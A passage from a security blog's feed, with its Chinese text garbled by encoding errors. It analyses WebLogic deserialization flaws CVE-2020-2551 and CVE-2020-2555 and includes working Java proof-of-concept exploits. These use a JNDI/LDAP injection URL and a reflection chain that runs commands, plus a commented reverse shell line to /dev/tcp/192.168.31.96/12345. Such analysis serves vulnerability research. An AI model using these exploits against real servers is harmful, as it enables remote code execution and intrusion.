alt="-w959"></p><p>‰πãÂêé<code>weblogic.rmi.internal.wls.WLSExecuteRequest#run</code>ËøõÂÖ•<code>weblogic.rmi.internal.BasicServerRef#handleRequest</code>Ëß£ÊûêËØ∑Ê±ÇÊï∞ÊçÆÔºåÂ¶ÇÊûúuserIdentity„ÄÅactionÂùá‰∏ç‰∏∫nullÔºàÂùá‰∏çÁî®Âú®ÊÑèÔºâÔºå‰ºö‰æùÊ¨°ËøõÂÖ•</p><ul><li><code>weblogic.rmi.cluster.ClusterableServerRef#invoke</code></li><li><code>weblogic.corba.idl.CorbaServerRef#invoke</code><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846285113448.jpg" alt="-w891"></li></ul><p>Â¶ÇÊûúmethod‰∏ç‰∏∫objectMedthods‰πã‰∏ÄÔºàÂÆö‰πâÂú®CorbaServerRefÊúÄÂ∫ïÈÉ®ÔºâÔºåÂàô‰ºöËøõÂÖ•<code>this.delegate._invoke</code>Âç≥<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846290493783.jpg" alt="-w1224"></p><p>ÈÄöËøáÂà§Êñ≠ method ËøõÂÖ•ÂØπÂ∫îÊµÅÁ®ã caseÔºåËøôÈáåËøõÂÖ• case 0</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846296787933.jpg" alt="-w1209"></p><p>ËøôÈáåÈÄöËøá<code>WNameHelper.read(InputStream istream)</code>ËØªÂèñÈÖçÁΩÆÂπ∂ËøõË°åÊ≥®ÂÜåÔºåÂú®ËØªÂèñlongÂûãÊï∞ÊçÆÊó∂‰ºöËøõË°å4 bytes ÂØπÈΩê</p><p>Á∫¢Ëâ≤ÈÉ®ÂàÜ‰∏∫Ê≥®ÂÜå‰∏™Êï∞ÔºåÈªëËâ≤ÈÉ®ÂàÜ‰∏∫ÂØπÈΩêÂøΩÁï•ÈÉ®ÂàÜÔºåÊ©òËâ≤‰∏∫ keyÔºåÁªøËâ≤‰∏∫ valueÔºåÂàÜÂà´ÂØπÂ∫î<code>id</code>Âíå<code>kind</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846330998516.jpg" alt="-w549"></p><p>ÁÑ∂ÂêéÂÖ≥Ê≥®<code>$result</code>ÊòØÂ¶Ç‰Ωï‰∫ßÁîüÁöÑÔºåÂÖàÂêéË∑üÂÖ•</p><ul><li><code>weblogic.iiop.IIOPInputStream#read_any</code></li><li><code>weblogic.corba.idl.AnyImpl#read_value</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341639516.jpg" alt="-w478"></p><p>È¶ñÂÖàÈÄöËøáËØªÂèñÁ±ªÂûã‰∏∫<code>1d</code>ÂêéÔºåÂ∞ÜËæìÂÖ•ÊµÅËøõË°åËß£Êûê</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341990330.jpg" alt="-w838"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846339190984.jpg" alt="-w552"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341251085.jpg" alt="-w586"></p><p>‰πãÂêéËøõÂÖ•ÈÄöËøáËÆæÁΩÆ type ËøõÂÖ•<code>weblogic.corba.idl.AnyImpl#read_value</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846343594879.jpg" alt="-w703"></p><p>‰πãÂêéË∑üÂÖ•<code>weblogic.corba.idl.AnyImpl#read_value_internal</code>ÔºåËøôÈáå‰ºöÊ†πÊçÆ type Á±ªÂûã(29)Â∞ùËØïËé∑ÂèñÊï∞ÊçÆ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846347052690.jpg" alt="-w676"></p><p>ËøôÈáå‰ºöËøõÂÖ•<code>weblogic.iiop.IIOPInputStream#read_value()</code>ÔºåÁúãÂà∞Â∫èÂàóÂåñÁöÑÊ†áÂøó</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846347768580.jpg" alt="-w415"></p><p>È¶ñÂÖà‰ºöËØªÂèñ valueTagÔºåÔºàËøôÈáåÂá∫Áé∞ÁöÑ<code>getIndirectionValue</code>‰∏çÁü•ÈÅìËÉΩ‰∏çËÉΩÂà©Áî®Ôºå‰∏ãÊù•ÁúãÁúãÔºâÔºåÈÄöËøáÊü•ÊâæÊòØÂê¶Â∑≤ÁªèÊúâËøáÂØπÂ∫î codebase ÈÅøÂÖçÈáçÂ§çËé∑ÂèñÔºåÂ¶ÇËã•Ê≤°ÊúâÂàô‰ºöÈÄöËøá‰πãÂêéÁöÑÊï∞ÊçÆËé∑ÂèñRMIÊ≥®ÂÜåË°®‰ø°ÊÅØ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846754165917.jpg" alt="-w862"></p><p>ÂØπÂ∫î‰ΩçÁΩÆÂ¶Ç‰∏ãÔºåÈªÑÁªøËâ≤‰∏∫ valueTagÔºåËìùËâ≤RMIÊ≥®ÂÜåÊï∞ÊçÆÈïøÂ∫¶ÔºåÁªøËâ≤‰∏∫RMIÊ≥®ÂÜåÂÜÖÂÆπÔºà‰πãÂêéÂ±ûÊÄßÂÄºËß£Êûê‰πüÁ±ª‰ººÔºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846760327927.jpg" alt="-w600"></p><p>Áî±‰∫éÊª°Ë∂≥<code>ObjectStreamClass.supportsUnsafeSerialization() == true</code>ÔºåËøõÂÖ•‰∏ãÈù¢ÁöÑÂ§ÑÁêÜÈÄªËæëÔºö</p><p>È¶ñÂÖàÈÄöËøáÂèçÂ∞ÑËé∑ÂèñÂÆû‰æãÂØπË±°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846763190170.jpg" alt="-w1646"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846764221761.jpg" alt="-w857"></p><p>‰πãÂêéËøõÂÖ•<code>weblogic.iiop.ValueHandlerImpl#readValue</code>ÔºåÈÄöËøáÊ∑±Â∫¶ÈÅçÂéÜÂ∞ÜÂÖ∂Â≠óÊÆµÂÖ®ÈÉ®ËØªÂèñÂá∫Êù•ÊîæÂÖ•<code>indirectionMap</code>ÂÜÖÂÆûÁé∞ÂÆåÊï¥Â∫èÂàóÂåñ</p><p>Âú®ËØªÂèñÂ±ûÊÄßÂÄºÊó∂ÔºåË∑üÂÖ•Âà∞<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846780406325.jpg" alt="-w767"></p><p>Âú®ËøôÈáåÂÖàÈÄöËøá<code>java.io.ObjectInputStream#defaultReadObject</code>‰ºöËØªÂèñÂ±ûÊÄßÂÄºÂà∞<code>JtaTransactionManager</code>‰∏≠ÔºåÂêåÊó∂ÁîüÊàê‰∏Ä‰∏™ JndiTemplate ÂÆû‰æã</p><p>Ë∑üÂÖ•<code>initUserTransactionAndTransactionManager</code>ÔºåÂΩìuserTransaction‰∏∫Á©∫Êó∂Ôºå‰ºöÈÄöËøá‰ªéÊèê‰æõÁöÑuserTransactionName‰∏≠ËøõË°åËØªÂèñ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846784321693.jpg" alt="-w793"></p><p>‰∏ÄË∑ØË∑üÂà∞<code>com.bea.core.repackaged.springframework.jndi.JndiTemplate#execute</code>ÔºåÂâ©‰∏ãÂ∞±ÊòØ JNDIÁöÑÂÜÖÂÆπ‰∫Ü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846788075894.jpg" alt="-w844"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li>JtaTransactionManagerÊòØspringÁàÜÂá∫ÁöÑ‰∏Ä‰∏™ÂèØ‰ª•JNDIÊ≥®ÂÖ•ÁöÑÁ±ªÔºåÂú®weblogic‰∏≠‰πüÂ≠òÂú®</li><li>weblogic.jndi.WLInitialContextFactory ÊòØweblogicÁöÑJNDIÂ∑•ÂéÇÁ±ª</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>bea<span class="token punctuation">.</span>core<span class="token punctuation">.</span>repackaged<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>jta<span class="token punctuation">.</span>JtaTransactionManager<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Gadgets<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2551</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// target host</span>        String port <span class="token operator">=</span> <span class="token string">"7001"</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// target port</span>        String url <span class="token operator">=</span> <span class="token string">"ldap://192.168.31.96:1099/exp2"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// rmi/ldap url</span>        Hashtable<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.factory.initial"</span><span class="token punctuation">,</span> <span class="token string">"weblogic.jndi.WLInitialContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.provider.url"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"iiop://%s:%s"</span><span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Context context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// get object to Deserialize</span>        JtaTransactionManager jtaTransactionManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JtaTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jtaTransactionManager<span class="token punctuation">.</span><span class="token function">setUserTransactionName</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        Remote remote <span class="token operator">=</span> Gadgets<span class="token punctuation">.</span><span class="token function">createMemoitizedProxy</span><span class="token punctuation">(</span>Gadgets<span class="token punctuation">.</span><span class="token function">createMap</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> jtaTransactionManager<span class="token punctuation">)</span><span class="token punctuation">,</span> Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> remote<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/2020-03-19%2011.14.37.gif" alt="2020-03-19 11.14.37"></p><h2 id="Êé®ËçêËµÑÊñô"><a href="#Êé®ËçêËµÑÊñô" class="headerlink" title="Êé®ËçêËµÑÊñô"></a>Êé®ËçêËµÑÊñô</h2><ol><li><a href="https://www.anquanke.com/post/id/201005#h3-17" target="_blank" rel="noopener">NATÁΩëÁªúÈóÆÈ¢ò</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ÊÑüËßâÂèàËØ•ÈáçÊ∏© JNDI ‰∫Ü„ÄÇ„ÄÇ„ÄÇ&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555 ÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/fa80d225/"/>
    <id>https://blog.sari3l.com/posts/fa80d225/</id>
    <published>2020-03-12T14:47:39.000Z</published>
    <updated>2020-07-06T09:45:26.072Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840234109363.jpg" alt></p><h2 id="Êê≠Âª∫"><a href="#Êê≠Âª∫" class="headerlink" title="Êê≠Âª∫"></a>Êê≠Âª∫</h2><p>Á¨¨‰∏ÄÊ¨°Ë∞É weblogicÔºåÈ•∂‰∫Ü‰∏ÄÂ§ßÂúà Orz</p><p>Êé®ËçêÔºö<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><ol><li>ÈÄöËøá‰∏äÈù¢ÁöÑÈ°πÁõÆÁõ¥Êé•ÁîüÊàê docker Âπ∂ÂêØÂä®</li><li>‰ªé docker ‰∏≠Êã∑Ë¥ù<code>/u01/app/oracle/middleware/wlserver/</code>&amp;<code>/u01/app/oracle/middleware/coherence/</code>Âá∫Êù•</li><li>‰ªé idea ÊâìÂºÄ wlserverÔºåÂ∞ÜÂÖ∂‰∏ã<code>moudules</code>&amp;<code>server/lib</code>Âä†ÂÖ• Libraries ‰∏≠</li><li>Â∞Ü coherence ÁõÆÂΩï‰∏ã lib ÂêåÊ†∑Âä†ÂÖ• Libraries</li><li>Ê∑ªÂä† remoteÔºåÂêØÂä® debug</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840233209710.jpg" alt="-w254"></p><h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840260151465.jpg" alt="-w676"></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÂÖ≥ÈîÆÂà©Áî®ÁÇπ<code>com.tangosol.util.filter.LimitFilter#toString</code>ÔºàÂ¶ÇÊûúÂàÜÊûêËøá commons-collectionsÔºåÂèØËÉΩÂØπËøôÈáåÂèØ‰ª•ÂæàÁÜüÊÇâÔºâÔºåËøôÈáå m_comparator„ÄÅm_oAnchorTopÂùáÂèØÊéßÔºå‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÁúãËÉΩÂê¶ÊúâÂèØÂà©Áî®ÁöÑ extract ÂáΩÊï∞Êù•Ëøõ‰∏ÄÊ≠•ÂèëÊå•</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840234657593.jpg" alt="-w1108"></p><p>Âú®<code>com.tangosol.util.extractor.ReflectionExtractor#extract</code>‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫Ü invokeÔºàËøôÁÜüÊÇâÁöÑÂë≥ÈÅìÔºåÈöæÈÅìÊ≤°ÊúâÊÉ≥Âà∞ commons-collections ‰∏≠ÁöÑ tranform ‰πàÔºâ</p><p>Âç≥Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂèçÂ∞ÑÊâßË°åÂëΩ‰ª§Ôºå‰ΩÜÈúÄË¶Å‰∏ÄÊù°ÂèçÂ∞ÑÈìæÊâçËÉΩ‰ªéÂ§¥Âà∞Â∞æÊâßË°åÊÅ∂ÊÑèÂëΩ‰ª§ÔºàÂÜçÊ¨°ÂõûÊÉ≥ChainedTransformerÔºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840236583179.jpg" alt="-w1184"></p><p>ËøôÊó∂ÂÖ≥Ê≥®Âà∞<code>com.tangosol.util.extractor.ChainedExtractor#extract</code>Ôºå‰∏ªË¶ÅÂú®Á¨¨‰∏ÄÊ≠•Ë∞ÉÁî®Êó∂ÈúÄË¶Å‰º†ÂÖ•<code>Runtime.class</code>Â∞±ÂèØ‰ª•ÁªÑÊàê‰∏ÄÊù°ÂÆåÊï¥ÁöÑË∞ÉÁî®ÈìæÔºåËÄå‰ªé<code>LimitFilter</code>‰º†ËøáÊù•<code>m_oAnchorTop</code>ÁöÑÂèàÊòØÂèØÊéßÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840239207524.jpg" alt="-w575"></p><p>Áé∞Âú®ÂëΩ‰ª§ÊâßË°åÈÉ®ÂàÜÂ∑≤ÁªèÊûÑÈÄ†ÂÆåÊàêÔºåÊàë‰ª¨ÈúÄË¶ÅÁöÑÊòØÂèçÂ∫èÂàóÂåñÂÖ•Âè£Âà∞Ëææ<code>LimitFilter#toString</code></p><p>ËøôÈáåÂèàÁî®Âà∞‰∫Ü<code>javax.management.BadAttributeValueExpException#BadAttributeValueExpException</code>ÔºàÂèàÊòØÁÜüÊÇâÁöÑÂë≥ÈÅìÔºåÁªÜÁúãcommons-collections 5ÔºâÔºåÊ≥®ÊÑèÂà∞ÂàùÂßãÂåñÊó∂ÈúÄË¶ÅËµãÂÄº‰∏∫ nullÔºåÂÜçÈÄöËøáÂèçÂ∞ÑËÆæÁΩÆÔºåÂê¶Âàô‰ºöÁõ¥Êé•Ëß¶Âèë<code>toString</code>ÊñπÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840241576297.jpg" alt="-w760"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ChainedExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ReflectionExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>filter<span class="token punctuation">.</span>LimitFilter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2555</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec(new String[]{""});</span>        ReflectionExtractor<span class="token punctuation">[</span><span class="token punctuation">]</span> reflectionExtractors <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"invoke"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"exec"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//                        new Object[]{new String[]{"/bin/sh", "-c", "/bin/sh -i &amp;> /dev/tcp/192.168.31.96/12345 0&lt;&amp;1"}}</span>                <span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedExtractor chainedExtractor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedExtractor</span><span class="token punctuation">(</span>reflectionExtractors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        chainedExtractor.extract(Runtime.class);</span>        LimitFilter limitFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LimitFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setComparator</span><span class="token punctuation">(</span>chainedExtractor<span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setTopAnchor</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        limitFilter.toString();</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> limitFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>        Serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        Serializer.deserialize();</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Serializer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        FileInputStream ios <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"java.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>ios<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/cve-2020-2555-1.gif" alt="cve-2020-2555-1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Á¨¨‰∏ÄÊ¨°Ë∞É weblogicÔºådocker ÈÉΩ‰∏ãÂçäÂ§©&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>Java ÂèçÂºπ Shell</title>
    <link href="https://blog.sari3l.com/posts/91ba290f/"/>
    <id>https://blog.sari3l.com/posts/91ba290f/</id>
    <published>2020-03-02T14:47:18.000Z</published>
    <updated>2020-07-06T09:45:18.005Z</updated>
    
